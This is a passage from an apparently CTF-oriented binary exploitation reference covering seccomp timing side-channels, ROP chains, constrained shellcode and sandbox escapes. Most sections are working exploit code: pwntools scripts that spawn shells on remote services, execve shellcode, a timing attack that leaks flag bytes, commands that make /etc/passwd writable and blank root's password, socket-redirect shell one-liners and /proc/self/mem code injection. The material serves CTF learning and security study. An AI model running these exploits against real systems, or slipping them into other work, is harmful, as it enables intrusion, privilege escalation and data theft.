; Assumes flag has been read into rsi via allowed read() syscall
mov al, [rsi + N]      ; flag byte N
cmp al, 0x41           ; compare with guess 'A'
jne done               ; skip if no match
; Timing loop: burns ~4 seconds on match
xor ecx, ecx
.loop: inc ecx
cmp ecx, 0xffffffff
jne .loop
done: xor edi, edi
mov eax, 60            ; exit
syscall
```

```python
from pwn import *
import time

FLAG_LEN = 40
CHARSET = string.printable

def guess_byte(offset, guess_char):
    """Send shellcode that delays if flag[offset] == guess_char"""
    sc = shellcraft.amd64.linux.open("flag.txt", 0)
    sc += shellcraft.amd64.linux.read("rax", "rsp", 100)
    sc += f"""
        mov al, byte ptr [rsp + {offset}]
        cmp al, {ord(guess_char)}
        jne done
        xor ecx, ecx
    loop:
        inc ecx
        cmp ecx, 0xffffffff
        jne loop
    done:
        xor edi, edi
        mov eax, 60
        syscall
    """
    r = remote(host, port)
    r.send(asm(sc))
    start = time.time()
    try:
        r.recvall(timeout=6)
    except:
        pass
    elapsed = time.time() - start
    r.close()
    return elapsed > 3.0  # Match if response took > 3 seconds

flag = ""
for i in range(FLAG_LEN):
    for c in CHARSET:
        if guess_byte(i, c):
            flag += c
            print(f"Flag so far: {flag}")
            break
```

**Key insight:** When seccomp blocks all output syscalls (`write`, `sendto`, `writev`), a flag byte can still be exfiltrated by comparing it against a guessed value and burning CPU time on match. The response time difference (instant vs ~4 seconds) reveals whether the guess was correct. Requires up to 256 * flag_length connections worst case, but printable ASCII reduces this to ~95 * flag_length.

**When to recognize:** Seccomp allows `open`/`read` but blocks all write-family syscalls. Also applicable when the binary has no output path at all (e.g., embedded systems, bare-metal challenges).

**References:** DEF CON 2017

---

## Useful Commands

```bash
one_gadget libc.so.6           # Find one-shot gadgets
ropper -f binary               # Find ROP gadgets
ROPgadget --binary binary      # Alternative gadget finder
seccomp-tools dump ./binary    # Check seccomp rules
```


# rop-and-shellcode

# CTF Pwn - ROP Chains and Shellcode

## Table of Contents
- [ROP Chain Building](#rop-chain-building)
  - [Two-Stage ret2libc (Leak + Shell)](#two-stage-ret2libc-leak--shell)
  - [Raw Syscall ROP (When system() Fails)](#raw-syscall-rop-when-system-fails)
  - [rdx Control in ROP Chains](#rdx-control-in-rop-chains)
  - [Shell Interaction After execve](#shell-interaction-after-execve)
- [ret2csu — __libc_csu_init Gadgets (Crypto-Cat)](#ret2csu--__libc_csu_init-gadgets-crypto-cat)
- [Bad Character Bypass via XOR Encoding in ROP (Crypto-Cat)](#bad-character-bypass-via-xor-encoding-in-rop-crypto-cat)
- [Exotic x86 Gadgets — BEXTR/XLAT/STOSB/PEXT (Crypto-Cat)](#exotic-x86-gadgets--bextrxlatstosbpext-crypto-cat)
  - [64-bit: BEXTR + XLAT + STOSB](#64-bit-bextr--xlat--stosb)
  - [32-bit: PEXT (Parallel Bits Extract)](#32-bit-pext-parallel-bits-extract)
- [Stack Pivot via xchg rax,esp (Crypto-Cat)](#stack-pivot-via-xchg-raxesp-crypto-cat)
- [sprintf() Gadget Chaining for Bad Character Bypass (PlaidCTF 2013)](#sprintf-gadget-chaining-for-bad-character-bypass-plaidctf-2013)
- [DynELF Automated Libc Discovery (RC3 CTF 2016)](#dynelf-automated-libc-discovery-rc3-ctf-2016)
- [Constrained Shellcode in Small Buffers (TUM CTF 2016)](#constrained-shellcode-in-small-buffers-tum-ctf-2016)
- [Stack Canary XOR Epilogue as RDX Zeroing Gadget (VolgaCTF 2017)](#stack-canary-xor-epilogue-as-rdx-zeroing-gadget-volgactf-2017)
- [Minimal Shellcode with Pre-Initialized Registers (Square CTF 2017)](#minimal-shellcode-with-pre-initialized-registers-square-ctf-2017)
- [Unique-Byte Shellcode via syscall RIP to RCX (HITCON 2017)](#unique-byte-shellcode-via-syscall-rip-to-rcx-hitcon-2017)

For double stack pivot, SROP with UTF-8 constraints, RETF architecture switch, seccomp bypass, .fini_array hijack, ret2vdso, pwntools template, and shellcode with input reversal, see [rop-advanced.md](rop-advanced.md).

---

## ROP Chain Building

```python
from pwn import *

elf = ELF('./binary')
libc = ELF('./libc.so.6')
rop = ROP(elf)

# Common gadgets
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]

# Leak libc
payload = flat(
    b'A' * offset,
    pop_rdi,
    elf.got['puts'],
    elf.plt['puts'],
    elf.symbols['main']
)
```

### Two-Stage ret2libc (Leak + Shell)

When exploiting in two stages, choose the return target for stage 2 carefully:

```python
# Stage 1: Leak libc via puts@PLT, then re-enter vuln for stage 2
payload1 = b'A' * offset
payload1 += p64(pop_rdi)
payload1 += p64(elf.got['puts'])
payload1 += p64(elf.plt['puts'])
payload1 += p64(CALL_VULN_ADDR)   # Address of 'call vuln' instruction in main

# IMPORTANT: Return target after leak
# - Returning to main may crash if check_status/setup corrupts stack
# - Returning to vuln directly may have stack issues
# - Best: return to the 'call vuln' instruction in main (e.g., 0x401239)
#   This sets up a clean stack frame via the CALL instruction
```

**Leak parsing with no-newline printf:**
```python
# If printf("Laundry complete") has no trailing newline,
# puts() leak appears right after it on the same line:
# Output: "Laundry complete\x50\x5e\x2c\x7e\x56\x7f\n"
p.recvuntil(b'Laundry complete')
leaked = p.recvline().strip()
libc_addr = u64(leaked.ljust(8, b'\x00'))
```

### Raw Syscall ROP (When system() Fails)

If calling `system()` or `execve()` via libc function entry crashes (CET/IBT, stack issues), use raw `syscall` instruction from libc gadgets:

```python
# Find gadgets in libc
libc_rop = ROP(libc)
pop_rax = libc_rop.find_gadget(['pop rax', 'ret'])[0]
pop_rdi = libc_rop.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi = libc_rop.find_gadget(['pop rsi', 'ret'])[0]
pop_rdx_rbx = libc_rop.find_gadget(['pop rdx', 'pop rbx', 'ret'])[0]  # common in modern glibc
syscall_ret = libc_rop.find_gadget(['syscall', 'ret'])[0]

# execve("/bin/sh", NULL, NULL) = syscall 59
payload = b'A' * offset
payload += p64(libc_base + pop_rax)
payload += p64(59)
payload += p64(libc_base + pop_rdi)
payload += p64(libc_base + next(libc.search(b'/bin/sh')))
payload += p64(libc_base + pop_rsi)
payload += p64(0)
payload += p64(libc_base + pop_rdx_rbx)
payload += p64(0)
payload += p64(0)  # rbx junk
payload += p64(libc_base + syscall_ret)
```

**When to use raw syscall vs libc functions:**
- `system()` through libc: simplest, but may crash due to stack alignment or CET
- `execve()` through libc: avoids `system()`'s subprocess overhead, same CET risk
- Raw `syscall`: bypasses all libc function prologues, most reliable for ROP
- Note: `pop rdx; ret` is rare in modern libc; look for `pop rdx; pop rbx; ret` instead

### rdx Control in ROP Chains

After calling libc functions (especially `puts`), `rdx` is often clobbered to a small value (e.g., 1). This breaks subsequent `read(fd, buf, rdx)` calls in ROP chains.

**Solutions:**
1. **pop rdx gadget from libc** -- `pop rdx; ret` is rare; look for `pop rdx; pop rbx; ret` (common at ~0x904a9 in glibc 2.35)
2. **Re-enter binary's read setup** -- Jump to code that sets `rdx` before `read`:
   ```python
   # vuln's read setup: lea rax,[rbp-0x40]; mov edx,0x100; mov rsi,rax; mov edi,0; call read
   # Set rbp first so rbp-0x40 points to target buffer:
   POP_RBP_RET = 0x40113d
   VULN_READ_SETUP = 0x4011ea  # lea rax, [rbp-0x40]

   payload += p64(POP_RBP_RET)
   payload += p64(TARGET_ADDR + 0x40)  # rbp-0x40 = TARGET_ADDR
   payload += p64(VULN_READ_SETUP)     # read(0, TARGET_ADDR, 0x100)
   # WARNING: After read, code continues to printf + leave;ret
   # leave sets rsp=rbp, so you get a stack pivot to rbp!
   ```
3. **Stack pivot via leave;ret** -- When re-entering vuln's read code, the `leave;ret` after read pivots the stack to `rbp`. Write your next ROP chain at `rbp+8` in the data you send via read.

### Shell Interaction After execve

After spawning a shell via ROP, the shell reads from the same stdin as the binary. Commands sent too early may be consumed by prior `read()` calls.

```python
p.send(payload)  # Trigger execve

# Wait for shell to initialize before sending commands
import time
time.sleep(1)
p.sendline(b'id')
time.sleep(0.5)
result = p.recv(timeout=3)

# For flag retrieval:
p.sendline(b'cat /flag* flag* 2>/dev/null')
time.sleep(0.5)
flag = p.recv(timeout=3)

# DON'T pipe commands via stdin when using pwntools - they get consumed
# by earlier read() calls. Use explicit sendline() after delays instead.
```

## ret2csu — __libc_csu_init Gadgets (Crypto-Cat)

**When to use:** Need to control `rdx`, `rsi`, and `edi` for a function call but no direct `pop rdx` gadget exists in the binary. `__libc_csu_init` is present in nearly all dynamically linked ELF binaries and contains two useful gadget sequences.

**Gadget 1 (pop chain):** At the end of `__libc_csu_init`:
```asm
pop rbx        ; 0
pop rbp        ; 1
pop r12        ; function pointer (address of GOT entry)
pop r13        ; edi value
pop r14        ; rsi value
pop r15        ; rdx value
ret
```

**Gadget 2 (call + set registers):** Earlier in `__libc_csu_init`:
```asm
mov rdx, r15   ; rdx = r15
mov rsi, r14   ; rsi = r14
mov edi, r13d  ; edi = r13 (32-bit!)
call [r12 + rbx*8]  ; call function pointer
add rbx, 1
cmp rbp, rbx
jne .loop      ; loop if rbx != rbp
; falls through to gadget 1 pop chain
```

**Exploit pattern:**
```python
csu_pop = elf.symbols['__libc_csu_init'] + OFFSET_TO_POP_CHAIN
csu_call = elf.symbols['__libc_csu_init'] + OFFSET_TO_MOV_CALL

payload = flat(
    b'A' * offset,
    csu_pop,
    0,            # rbx = 0 (index)
    1,            # rbp = 1 (loop count, must equal rbx+1)
    elf.got['puts'],  # r12 = function to call (GOT entry)
    0xdeadbeef,   # r13 → edi (first arg, 32-bit only!)
    0xcafebabe,   # r14 → rsi (second arg)
    0x12345678,   # r15 → rdx (third arg)
    csu_call,     # trigger mov + call
    b'\x00' * 56, # padding for the 7 pops after call returns
    next_gadget,  # return address after csu completes
)
```

**Limitations:** `edi` is set via `mov edi, r13d` — only the lower 32 bits are written. For 64-bit first arguments, use a `pop rdi; ret` gadget instead. The function is called via `call [r12 + rbx*8]` — an indirect call through a pointer, so `r12` must point to a GOT entry or other memory containing the target address.

**Key insight:** ret2csu provides universal gadgets for setting up to 3 arguments (`rdi`, `rsi`, `rdx`) and calling any function via its GOT entry, without needing libc gadgets. Useful when the binary is statically small but dynamically linked.

---

## Bad Character Bypass via XOR Encoding in ROP (Crypto-Cat)

**When to use:** ROP payload must write data (e.g., `"/bin/sh"` or `"flag.txt"`) to memory, but certain bytes are forbidden (null bytes, newlines, spaces, etc.).

**Strategy:** XOR each chunk of data with a known key, write the XOR'd value to `.data` section, then XOR it back in place using gadgets from the binary.

**Required gadgets:**
```asm
pop r14; pop r15; ret          ; load XOR key (r14) and target address (r15)
xor [r15], r14; ret            ; XOR memory at r15 with r14
mov [r15], r14; ret            ; write r14 to memory at r15 (initial write)
```

**Exploit pattern:**
```python
data_section = elf.symbols['__data_start']  # or .data address
xor_key = 2  # simple key that removes bad chars

def xor_bytes(data, key):
    return bytes(b ^ key for b in data)

target = b"flag.txt"
encoded = xor_bytes(target, xor_key)

payload = b'A' * offset

# Write XOR'd data in 8-byte chunks
for i in range(0, len(encoded), 8):
    chunk = encoded[i:i+8].ljust(8, b'\x00')
    payload += flat(
        pop_r14_r15,
        chunk,                    # XOR'd data
        data_section + i,         # destination address
        mov_r15_r14,              # write to memory
    )

# XOR each chunk back to recover original
for i in range(0, len(target), 8):
    payload += flat(
        pop_r14_r15,
        p64(xor_key),             # XOR key
        data_section + i,         # target address
        xor_r15_r14,              # decode in place
    )

# Now data_section contains "flag.txt" — use it as argument
payload += flat(pop_rdi, data_section, elf.plt['print_file'])
```

**Key insight:** XOR is self-inverse (`a ^ k ^ k = a`). Choose a key that transforms all forbidden bytes into allowed ones. For simple cases, XOR with `2` or `0x41` works. For complex restrictions, solve per-byte: for each position, find any key byte where `original ^ key` avoids all bad characters.

---

## Exotic x86 Gadgets — BEXTR/XLAT/STOSB/PEXT (Crypto-Cat)

**When to use:** Standard `mov [reg], reg` write gadgets don't exist in the binary. Look for obscure x86 instructions that can be chained for byte-by-byte memory writes.

### 64-bit: BEXTR + XLAT + STOSB

**BEXTR** (Bit Field Extract) extracts bits from a source register. **XLAT** translates a byte via table lookup (`al = [rbx + al]`). **STOSB** stores `al` to `[rdi]` and increments `rdi`.

```python
# Gadgets from questionableGadgets section of binary
xlat_ret = elf.symbols.questionableGadgets          # xlat byte ptr [rbx]; ret
bextr_ret = elf.symbols.questionableGadgets + 2     # pop rdx; pop rcx; add rcx, 0x3ef2;
                                                     # bextr rbx, rcx, rdx; ret
stosb_ret = elf.symbols.questionableGadgets + 17    # stosb byte ptr [rdi], al; ret

data_section = elf.symbols.__data_start

# Write "flag.txt" byte by byte
for i, char in enumerate(b"flag.txt"):
    # Find address of char in binary's read-only data
    char_addr = next(elf.search(bytes([char])))

    # BEXTR extracts rbx from rcx using rdx as control
    # rcx = char_addr - 0x3ef2 (compensate for add)
    # rdx = 0x4000 (extract 64 bits starting at bit 0)
    payload += flat(
        bextr_ret,
        0x4000,                    # rdx (BEXTR control: start=0, len=64)
        char_addr - 0x3ef2,        # rcx (offset compensated)
        xlat_ret,                  # al = byte at [rbx + al]
        pop_rdi,
        data_section + i,
        stosb_ret,                 # [rdi] = al; rdi++
    )
```

### 32-bit: PEXT (Parallel Bits Extract)

**PEXT** selects bits from a source using a mask and packs them contiguously. Combined with BSWAP and XCHG for byte-level writes.

```python
# Gadgets
pext_ret = elf.symbols.questionableGadgets           # mov eax,ebp; mov ebx,0xb0bababa;
                                                      # pext edx,ebx,eax; ...ret
bswap_ret = elf.symbols.questionableGadgets + 21     # pop ecx; bswap ecx; ret
xchg_ret = elf.symbols.questionableGadgets + 18      # xchg byte ptr [ecx], dl; ret

# For each target byte, compute mask so that PEXT(0xb0bababa, mask) = target_byte
def find_mask(target_byte, source=0xb0bababa):
    """Find 32-bit mask that extracts target_byte from source via PEXT."""
    source_bits = [(source >> i) & 1 for i in range(32)]
    target_bits = [(target_byte >> i) & 1 for i in range(8)]
    # Select 8 bits from source that match target bits
    mask = 0
    matched = 0
    for i in range(32):
        if matched < 8 and source_bits[i] == target_bits[matched]:
            mask |= (1 << i)
            matched += 1
    return mask if matched == 8 else None
```

**Key insight:** When a binary lacks standard write gadgets, exotic instructions (BEXTR, PEXT, XLAT, STOSB, BSWAP, XCHG) can be chained for the same effect. Check `questionableGadgets` or similar labeled sections in challenge binaries.

---

## Stack Pivot via xchg rax,esp (Crypto-Cat)

**When to use:** Buffer is too small for the full ROP chain, but the program leaks a heap/stack address where a larger buffer has been prepared.

**Two-stage pattern:**
```python
# Stage 1: Program provides a heap address where it wrote user data
pivot_addr = int(io.recvline(), 16)

# Prepare ROP chain at the pivot address (via earlier input)
stage2_rop = flat(
    pop_rdi, elf.got['puts'],
    elf.plt['puts'],             # leak libc
    elf.symbols['main'],         # return to main for stage 3
)
io.send(stage2_rop)             # Written to pivot_addr by program

# Stage 2: Overflow with stack pivot
xchg_rax_esp = elf.symbols.usefulGadgets + 2  # xchg rax, esp; ret
pop_rax = elf.symbols.usefulGadgets            # pop rax; ret

payload = flat(
    b'A' * offset,
    pop_rax,
    pivot_addr,         # load pivot address into rax
    xchg_rax_esp,       # swap rax ↔ esp → stack now points to stage2_rop
)
```

**Why xchg vs. leave;ret:**
- `leave; ret` sets `rsp = rbp` — requires controlling `rbp` (often possible via overflow)
- `xchg rax, esp` swaps directly — requires controlling `rax` (via `pop rax; ret`)
- `xchg` works even when `rbp` is not on the stack (e.g., small buffer overflow)

**Limitation:** `xchg rax, esp` truncates to 32-bit on x86-64 (sets upper 32 bits of rsp to 0). The pivot address must be in the lower 4GB of address space. Heap and mmap regions often qualify; stack addresses (0x7fff...) do not.

---

## sprintf() Gadget Chaining for Bad Character Bypass (PlaidCTF 2013)

**Pattern:** When shellcode contains bytes filtered by the input handler (null, space, slash, colon, etc.), use `sprintf()` to copy individual bytes from the executable's own memory — one byte at a time — to assemble clean shellcode on BSS.

```python
from pwn import *

# Step 1: Scan executable for addresses containing each needed byte
exe_data = open('binary', 'rb').read()
byte_addrs = {}  # Maps byte value -> address in executable
for c in range(256):
    for i in range(len(exe_data)):
        addr = exe_base + i
        if exe_data[i] == c and not has_bad_chars(p32(addr)):
            byte_addrs[c] = addr
            break

# Step 2: Chain sprintf(bss_dest, byte_addr) for each shellcode byte
rop = b''
for i, byte in enumerate(shellcode):
    rop += p32(sprintf_plt)
    rop += p32(pop3ret)           # Clean 3 args
    rop += p32(bss_addr + i)     # Destination
    rop += p32(byte_addrs[byte]) # Source (1 byte + null terminator)
    rop += p32(0)                # Unused arg

# Step 3: Jump to assembled shellcode on BSS
rop += p32(bss_addr)
```

**Key insight:** `sprintf(dst, src)` copies bytes until a null terminator — effectively a single-byte copy when `src` points to a byte followed by `\x00`. Each call in the ROP chain places one shellcode byte. The source addresses come from the binary's own `.text`/`.rodata` sections. Requires a `pop3ret` gadget for stack cleanup between calls.

---

## DynELF Automated Libc Discovery (RC3 CTF 2016)

When the remote libc version is unknown, use pwntools' `DynELF` to resolve function addresses at runtime by leaking memory through a format string or read primitive.

```python
from pwn import *

elf = ELF('./target')
io = remote('target.ctf', 1337)

# Define a leak function that reads memory at a given address
def leak(addr):
    payload = b'A' * offset
    payload += p64(elf.plt['printf'])  # call printf to leak
    payload += p64(main_addr)          # return to main for next leak
    payload += p64(addr)               # argument: address to read
    io.sendline(payload)
    data = io.recvuntil(b'prompt', drop=True)
    return data

# DynELF resolves symbols by parsing ELF structures in memory
d = DynELF(leak, elf=elf)
system_addr = d.lookup('system', 'libc')
binsh_addr = d.lookup(None, 'libc')  # search for "/bin/sh" string

log.success(f"system @ {hex(system_addr)}")

# Build final ROP chain with resolved addresses
payload = b'A' * offset
payload += p64(pop_rdi_ret)
payload += p64(binsh_addr)
payload += p64(system_addr)
io.sendline(payload)
io.interactive()
```

**Key insight:** DynELF parses the remote ELF's `.dynamic` section, link map, and symbol tables to resolve any libc function without knowing the libc version. Requires a reliable memory read primitive (leak function) that can read arbitrary addresses.

---

## Constrained Shellcode in Small Buffers (TUM CTF 2016)

When shellcode space is severely limited (e.g., 15-16 bytes due to AES block size), use minimal register setup and avoid unnecessary instructions.

```asm
; 15-byte execve("/bin/sh") shellcode for x86-64
; Assumes: rsp points to writable area, "/bin/sh\0" follows shellcode on stack
; Written in fasm syntax:

lea rdi, [rsp + 0x19]    ; 4 bytes - pointer to "/bin/sh" on stack
cdq                       ; 1 byte  - rdx = 0 (envp = NULL)
push rdx                  ; 1 byte  - NULL terminator for argv
push rdi                  ; 1 byte  - argv[0] = "/bin/sh"
push rsp                  ; 1 byte
pop rsi                   ; 1 byte  - rsi = argv = {"/bin/sh", NULL}
push 0x3b                 ; 2 bytes - syscall number for execve
pop rax                   ; 1 byte  - rax = 59
syscall                   ; 2 bytes - execve("/bin/sh", argv, NULL)
; Total: 15 bytes

; When AES-CBC is involved, craft IV to XOR-decrypt shellcode block:
; crafted_iv = AES_decrypt(known_ciphertext) XOR shellcode
```

**Key insight:** The `cdq` instruction (1 byte) zero-extends eax into edx, and `push reg; pop reg` pairs (2 bytes) replace `mov` (3 bytes). For AES-block-constrained shellcode, compute the IV that decrypts to your shellcode by XORing `AES_decrypt(ciphertext_block)` with the desired shellcode.

---

## Stack Canary XOR Epilogue as RDX Zeroing Gadget (VolgaCTF 2017)

**When to use:** Need `rdx = 0` for `execve(path, argv, NULL)` but no `pop rdx; ret` gadget exists in the binary. The canary verification epilogue `xor rdx, fs:28h` zeros RDX when the canary is intact.

```python
from pwn import *

# Canary check epilogue (found in most binaries):
# mov rdx, [rsp+8]    ; load canary from stack
# xor rdx, fs:28h     ; XOR with stored canary → 0 if intact
# Jump into this code as a "gadget" to zero RDX

# Find the canary check sequence in the binary
canary_xor_gadget = next(binary.search(asm(
    "mov rdx, [rsp+8]; xor rdx, qword ptr fs:[0x28]"
)))
# Side effect: harmless write of je result, rdx = 0 for execve(path, argv, NULL)

# Use in ROP chain:
rop = flat(
    pop_rdi, binsh_addr,          # rdi = "/bin/sh"
    pop_rsi, 0,                   # rsi = NULL (argv)
    canary_xor_gadget,            # rdx = canary ^ fs:28h = 0
    execve_addr,                  # execve("/bin/sh", NULL, NULL)
)
```

**Key insight:** The stack canary check `xor rdx, fs:28h` produces `rdx=0` when the canary is correct. Jump into this epilogue as a gadget when `pop rdx` is unavailable -- it provides a reliable zero-rdx primitive with only a benign byte-write side effect. This works because the canary on the stack matches `fs:28h`, so the XOR result is always zero in a non-corrupted frame.

**When to recognize:** ROP chain needs `rdx=0` (common for `execve` third argument) but the binary lacks `pop rdx; ret` or `pop rdx; pop rbx; ret`. Search for `xor rdx, qword ptr fs:` in the binary's disassembly -- it appears in every function with a stack canary.

**References:** VolgaCTF 2017

---

## Minimal Shellcode with Pre-Initialized Registers (Square CTF 2017)

**Pattern:** When the shellcode entry point has registers already initialized to useful values (e.g., `eax=4` for the `write` syscall on x86-32, `ebx=1` for stdout), exploit them to dramatically reduce shellcode size. Always audit register state at entry before writing shellcode from scratch.

**Example (x86-32 write syscall, entry: eax=4, ebx=1):**
```asm
; Entry state: eax=4 (sys_write), ebx=1 (stdout fd)
; Goal: write flag buffer to stdout — only need ecx and edx

; 3-byte: point ecx at the flag buffer
lea ecx, [edi + flag_offset]   ; 3 bytes (if offset fits in 1 byte)

; 2-byte: set edx (byte count)
mov dl, 64                      ; 2 bytes

; 2-byte: trigger syscall
int 0x80                        ; 2 bytes

; Total: 7 bytes — or as few as 5 if edx is already set
```

**Workflow:**
```python
# 1. Run the binary in gdb, break right before shellcode is executed
# 2. Inspect all registers: info registers
# 3. Identify which syscall arguments are already set
# 4. Write only the instructions needed to fill missing arguments

# Useful pre-initialized patterns:
# - eax = syscall number already set by caller
# - ebx = fd (stdin=0, stdout=1) from prior open/setup
# - rdi, rsi from calling convention leakage
# - rsp pointing into a writable region (for push-based addressing)
```

**Key insight:** Always audit entry register values before writing shellcode — pre-loaded syscall numbers and fd values can reduce shellcode to under 6 bytes. The smallest possible shellcode exploits the ABI calling convention residue left by the surrounding code.

**References:** Square CTF 2017

---

## Unique-Byte Shellcode via syscall RIP to RCX (HITCON 2017)

**Pattern:** x86-64 `syscall` instruction saves `RIP` (next instruction address) into `RCX` as a side effect. An 8-byte stager exploits this: execute `syscall` (which also triggers a `read` with pre-set registers), then use `rcx` (now = address of the instruction after `syscall`) as the address for reading the full shellcode to the same RWX location. All 8 bytes of the stager must be unique (no repeated bytes).

**8-byte stager construction:**
```asm
; Entry constraints: rax=0 (read), rdi=0 (stdin), rsi=shellcode_buf, rdx=8 (small)
; Side effect of syscall: rcx = RIP (address of next instruction after syscall)

syscall          ; 2 bytes: 0f 05 — executes read(0, shellcode_buf, 8)
                 ;           and sets rcx = &next_instr (= shellcode_buf + 2)
push rcx         ; 1 byte:  51 — stack = [shellcode_buf + 2]
pop rsi          ; 1 byte:  5e — rsi = shellcode_buf + 2 (where full shellcode goes)
xor edx, edx     ; 2 bytes: 31 d2 — clear rdx
mov dl, 100      ; 2 bytes: b2 64 — rdx = 100 (read size for stage 2)
; Back to syscall (loop): the push/pop sequence ends up jumping to syscall again
; ... or arrange entry so the next syscall reads 100 bytes to rsi
```

**Uniqueness constraint:**
```python
# All 8 bytes must be distinct (challenge-specific filter)
# Candidate sequence: 0f 05 51 5e 31 d2 b2 64  — all unique
# Verify: len(set(bytes)) == len(bytes)
stager = bytes([0x0f, 0x05, 0x51, 0x5e, 0x31, 0xd2, 0xb2, 0x64])
assert len(set(stager)) == len(stager)  # passes

# Stage 2: full execve shellcode sent to stdin after stager runs first syscall
from pwn import *
p.send(stager)
p.send(asm(shellcraft.sh()))
```

**Key insight:** x86-64 `syscall` copies RIP to RCX — weaponize this as position-independent address discovery for tiny shellcode stagers. The stager needs no hardcoded addresses: it calculates its own location via the `syscall` side effect, then uses that address as the destination for reading the full payload.

**References:** HITCON CTF 2017


# sandbox-escape

# CTF Pwn - Sandbox Escape and Restricted Environments

## Table of Contents
- [Python Sandbox Escape](#python-sandbox-escape)
- [VM Exploitation (Custom Bytecode)](#vm-exploitation-custom-bytecode)
- [FUSE/CUSE Character Device Exploitation](#fusecuse-character-device-exploitation)
- [Busybox/Restricted Shell Escalation](#busyboxrestricted-shell-escalation)
- [Shell Tricks](#shell-tricks)
- [Write-Anywhere via /proc/self/mem (BSidesSF 2025)](#write-anywhere-via-procselfmem-bsidessf-2025)
- [process_vm_readv Failure as Sandbox Escape (0CTF 2016)](#process_vm_readv-failure-as-sandbox-escape-0ctf-2016)
- [Named Pipe mkfifo for File Size Check Bypass (Nuit du Hack 2016)](#named-pipe-mkfifo-for-file-size-check-bypass-nuit-du-hack-2016)
- [Lua Integer Underflow via Game Logic (ASIS CTF Finals 2017)](#lua-integer-underflow-via-game-logic-asis-ctf-finals-2017)

---

## Python Sandbox Escape

Python jail/sandbox escape techniques (AST bypass, audit hook bypass, MRO-based builtin recovery, decorator chains, restricted charset tricks, and more) are covered comprehensively in the `ctf-misc` skill — invoke `/ctf-misc` for pyjail techniques.

## VM Exploitation (Custom Bytecode)

**Pattern (TerViMator, Pragyan 2026):** Custom VM with registers, opcodes, syscalls. Full RELRO + NX + PIE.

**Common vulnerabilities in VM syscalls:**
- **OOB read/write:** `inspect(obj, offset)` and `write_byte(obj, offset, val)` without bounds checking allows read/modify object struct data beyond allocated buffer
- **Struct overflow via name:** `name(obj, length)` writing directly to object struct allows overflowing into adjacent struct fields

**Exploitation pattern:**
1. Allocate two objects (data + exec)
2. Use OOB `inspect` to read exec object's XOR-encoded function pointer to leak PIE base
3. Use `name` overflow to rewrite exec object's pointer with `win() ^ KEY`
4. `execute(obj)` decodes and calls the patched function pointer

## FUSE/CUSE Character Device Exploitation

**FUSE** (Filesystem in Userspace) / **CUSE** (Character device in Userspace)

**Key insight:** FUSE/CUSE devices run handler code in userspace with the permissions of the device daemon. If the daemon runs as root and exposes a command interface via the write handler, any user who can write to the device file gains root-level operations (chmod, file read/write).

**Identification:**
- Look for `cuse_lowlevel_main()` or `fuse_main()` calls
- Device operations struct with `open`, `read`, `write` handlers
- Device name registered via `DEVNAME=backdoor` or similar

**Common vulnerability patterns:**
```c
// Backdoor pattern: write handler with command parsing
void backdoor_write(const char *input, size_t len) {
    char *cmd = strtok(input, ":");
    char *file = strtok(NULL, ":");
    char *mode = strtok(NULL, ":");
    if (!strcmp(cmd, "b4ckd00r")) {
        chmod(file, atoi(mode));  // Arbitrary chmod!
    }
}
```

**Exploitation:**
```bash
# Change /etc/passwd permissions via custom device
echo "b4ckd00r:/etc/passwd:511" > /dev/backdoor

# 511 decimal = 0777 octal (rwx for all)
# Now modify passwd to get root
echo "root::0:0:root:/root:/bin/sh" > /etc/passwd
su root
```

**Privilege escalation via passwd modification:**
1. Make `/etc/passwd` writable via the backdoor
2. Replace root line with `root::0:0:root:/root:/bin/sh` (no password)
3. `su root` without password prompt

## Busybox/Restricted Shell Escalation

When in restricted environment without sudo:
1. Find writable paths via character devices
2. Target system files: `/etc/passwd`, `/etc/shadow`, `/etc/sudoers`
3. Modify permissions then content to gain root

**Key insight:** In restricted environments without sudo, look for custom character devices (`/dev/backdoor`) or writable system files. Any write primitive to `/etc/passwd` (remove root's password hash) or `/etc/sudoers` (add NOPASSWD entry) gives root.

## Shell Tricks

**File descriptor redirection (no reverse shell needed):**
```bash
# Redirect stdin/stdout to client socket (fd 3 common for network)
exec <&3; sh >&3 2>&3

# Or as single command string
exec<&3;sh>&3
```
- Network servers often have client connection on fd 3
- Avoids firewall issues with outbound connections
- Works when you have command exec but limited chars

**Find correct fd:**
```bash
ls -la /proc/self/fd           # List open file descriptors
```

**Short shellcode alternatives:**
- `sh<&3 >&3` - minimal shell redirect
- Use `$0` instead of `sh` in some shells

**Key insight:** Network servers typically have the client socket on fd 3. Redirecting stdin/stdout to this fd (`exec <&3; sh >&3 2>&3`) gives an interactive shell over the existing connection without needing outbound connectivity for a reverse shell.

---

## Write-Anywhere via /proc/self/mem (BSidesSF 2025)

When a service allows writing to arbitrary files at arbitrary offsets, target `/proc/self/mem` for code injection:

```python
from pwn import *

# Service API: send filename, offset, content
def write_mem(r, offset, data):
    r.sendline(b'/proc/self/mem')
    r.sendline(str(offset).encode())
    r.sendline(data)

# 1. Leak a return address from the stack (or use known binary address)
# 2. Write shellcode to a writable+executable region (or reuse existing code)
# 3. Overwrite return address to point to shellcode

shellcode = asm(shellcraft.sh())

r = remote(host, port)
# Overwrite code at known address (e.g., after close@plt returns)
write_mem(r, target_code_addr, shellcode)
```

**Key insight:** `/proc/self/mem` provides random-access read/write to the process's virtual memory, bypassing page protections that mmap enforces. Writing to text segments (code) works even when the segment is mapped read-only via normal mmap -- the kernel performs the write through the page tables directly. This makes it equivalent to a debugger `PTRACE_POKETEXT`.

**Requirements:** File write primitive must handle binary data (null bytes). The target offset must be a valid mapped virtual address.

---

### process_vm_readv Failure as Sandbox Escape (0CTF 2016)

**Pattern:** Sandbox validates file paths by calling `process_vm_readv()` then `realpath()`. By mapping memory with `PROT_READ` only (not remotely readable by `process_vm_readv` from the sandbox process), path validation fails silently, bypassing the check.

```c
// Create memory at fixed address with only read permission
mmap(0x13370000, 0x1000, PROT_READ, MAP_FIXED|MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
// Store path string there -- sandbox's process_vm_readv fails
// realpath() also fails -- path check bypassed entirely
// Then: open("/flag") succeeds through the sandbox
```

**Key insight:** Sandbox path validation using `process_vm_readv` assumes validation will succeed or deny. The failure case (unreadable memory) is unhandled, creating a bypass. The sandboxed process can read its own memory normally, but the supervisor process cannot read it via `process_vm_readv`.

**References:** 0CTF 2016

---

### Named Pipe mkfifo for File Size Check Bypass (Nuit du Hack 2016)

